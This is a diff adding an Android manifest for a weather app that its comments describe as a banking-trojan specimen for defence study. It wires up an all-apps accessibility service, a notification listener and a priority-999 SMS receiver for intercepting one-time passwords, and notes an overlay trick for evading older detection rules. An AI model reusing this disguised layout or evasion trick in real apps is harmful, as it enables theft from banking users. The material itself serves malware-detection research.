@@ -1,0 +1,161 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <!-- Permissions justified by weather app functionality -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!--
+      Stage 2: Accessibility permission.
+      BIND_ACCESSIBILITY_SERVICE is declared on the <service>, not <uses-permission>.
+      NO SYSTEM_ALERT_WINDOW — TYPE_ACCESSIBILITY_OVERLAY bypasses it entirely.
+      This is the 2025 evasion: overlay without SAW permission in manifest.
+      Pre-2025 detection rules that key on SAW will MISS this specimen.
+    -->
+
+    <!--
+      Stage 3: SMS permissions.
+      RECEIVE_SMS + READ_SMS = dangerous permissions, runtime grant required.
+      Plausible rationale for weather app: "SMS-based severe weather alerts"
+      Analyst tell: SMS permissions on a weather app = high-confidence banker.
+      Play Protect specifically flags utility apps requesting SMS.
+      The COMBINATION of A11y + NLS + SMS in one package = canonical banker shape.
+    -->
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+
+    <application
+        android:name=".App"
+        android:allowBackup="true"
+        android:icon="@android:drawable/ic_menu_compass"
+        android:label="@string/app_name"
+        android:roundIcon="@android:drawable/ic_menu_compass"
+        android:supportsRtl="true"
+        android:usesCleartextTraffic="true"
+        android:networkSecurityConfig="@xml/network_security_config"
+        android:theme="@style/Theme.SkyWeather">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".ForecastActivity"
+            android:label="@string/forecast_title"
+            android:parentActivityName=".MainActivity" />
+
+        <activity
+            android:name=".SettingsActivity"
+            android:label="@string/settings_title"
+            android:parentActivityName=".MainActivity" />
+
+        <activity
+            android:name=".SearchActivity"
+            android:label="@string/search_title"
+            android:parentActivityName=".MainActivity" />
+
+        <activity
+            android:name=".AboutActivity"
+            android:label="About"
+            android:parentActivityName=".MainActivity" />
+
+        <activity
+            android:name=".EnableAccessibilityActivity"
+            android:label="Voice Updates"
+            android:parentActivityName=".MainActivity"
+            android:theme="@style/Theme.SkyWeather" />
+
+        <!--
+          AccessibilityService declaration.
+
+          BIND_ACCESSIBILITY_SERVICE permission on the <service> means only
+          the system can bind to it (security requirement).
+
+          The meta-data points to accessibility_config.xml which declares:
+            - ALL event types (maximally permissive — banker shape)
+            - NO package filter (monitors ALL apps — banker shape)
+            - canRetrieveWindowContent (reads screen text — banker shape)
+            - canPerformGestures (injects taps — ATS shape)
+
+          Service label/description use benign weather-related text.
+          Analyst tell: maximally-permissive config + canPerformGestures
+          on a WEATHER app = high-confidence banker.
+        -->
+        <service
+            android:name=".core.VoiceReadoutService"
+            android:label="@string/a11y_label"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_config" />
+        </service>
+
+        <!--
+          NotificationListenerService — OTP intercept via push notifications.
+          BIND_NOTIFICATION_LISTENER_SERVICE = only system can bind.
+          User must enable in Settings > Notification access.
+          No <uses-permission> needed — binding permission on <service> suffices.
+
+          Analyst tell: NLS + A11y + SMS receiver in one package.
+          This is the canonical 2024-2026 banker permission triad.
+          See ANALYSIS §5.2 and spoke notification-listener-otp-intercept.md.
+        -->
+        <service
+            android:name=".core.WeatherAlertListener"
+            android:label="@string/nls_label"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!--
+          SMS BroadcastReceiver — OTP intercept via incoming SMS.
+          Priority 999 = fires BEFORE the default SMS app.
+
+          CRITICAL BANKER TELL: android:priority="999" on SMS_RECEIVED
+          is one of the single most reliable static indicators.
+          Every ML classifier and every AV heuristic keys on this.
+          Real SharkBot/FluBot use this exact pattern.
+
+          Why we keep it despite being a detection magnet:
+          This specimen demonstrates the FULL banker shape including
+          the parts that ARE detectable. Stage 1 evades; Stage 3
+          deliberately creates detectable surface for defense study.
+        -->
+        <receiver
+            android:name=".core.AlertMessageReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Home screen widget -->
+        <receiver
+            android:name=".widget.WeatherWidgetProvider"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
+                <action android:name="com.skyweather.forecast.WIDGET_REFRESH" />
+            </intent-filter>
+            <meta-data
+                android:name="android.appwidget.provider"
+                android:resource="@xml/widget_info" />
+        </receiver>
+
+    </application>
+</manifest>
